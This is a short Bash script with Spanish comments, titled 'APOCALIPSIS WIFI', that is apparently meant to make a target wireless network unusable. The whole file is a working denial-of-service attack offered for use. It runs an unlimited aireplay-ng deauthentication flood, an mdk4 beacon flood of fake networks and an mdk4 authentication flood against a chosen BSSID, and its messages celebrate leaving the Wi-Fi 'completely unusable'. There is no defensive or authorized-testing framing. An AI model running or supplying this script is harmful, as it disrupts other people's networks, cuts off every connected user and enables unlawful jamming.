#!/bin/bash
# APOCALIPSIS_WIFI.sh - EL MÁS AGRESIVO

INTERFAZ="wlan0mon"
BSSID="AA:BB:CC:DD:EE:FF"  # CAMBIA ESTO

# Verificar que estamos en modo monitor
if ! iwconfig $INTERFAZ 2>/dev/null | grep -q "Mode:Monitor"; then
    echo "❌ $INTERFAZ no está en modo monitor"
    echo "Ejecuta: sudo airmon-ng start wlan0"
    exit 1
fi

# Función para limpiar al salir
cleanup() {
    echo ""
    echo "🛑 Deteniendo todos los ataques..."
    sudo pkill -f aireplay-ng
    sudo pkill -f mdk4
    sudo pkill -f airodump-ng
    echo "✅ Detenido"
    exit 0
}

trap cleanup SIGINT SIGTERM

echo "============================================"
echo "💀 APOCALIPSIS WIFI - MODO NUCLEAR 💀"
echo "============================================"
echo "🎯 Objetivo: $BSSID"
echo "📡 Interfaz: $INTERFAZ"
echo "⚡ Iniciando ataques..."
echo "🔴 Presiona CTRL+C para detener TODO"
echo ""

# 1. Deauth masivo (desconecta todo)
sudo aireplay-ng --deauth 0 -a $BSSID $INTERFAZ > /dev/null 2>&1 &

# 2. Beacon flood (redes falsas)
sudo mdk4 $INTERFAZ b -n -c 1-11 -s 1000 > /dev/null 2>&1 &

# 3. Autenticación falsa (satura router)
sudo mdk4 $INTERFAZ a -a $BSSID -c -m > /dev/null 2>&1 &

# 4. Escaneo agresivo de dispositivos (opcional)
sudo airodump-ng $INTERFAZ > /dev/null 2>&1 &

echo "🔥 ATAQUES ACTIVOS:"
echo "   - Deauth: Todos los dispositivos se desconectan"
echo "   - Beacon: Cientos de redes falsas visibles"
echo "   - Auth: Router saturado con conexiones falsas"
echo ""
echo "😈 El WiFi debería estar completamente INUTILIZABLE"
echo ""

# Mantener el script corriendo
while true; do
    sleep 1
done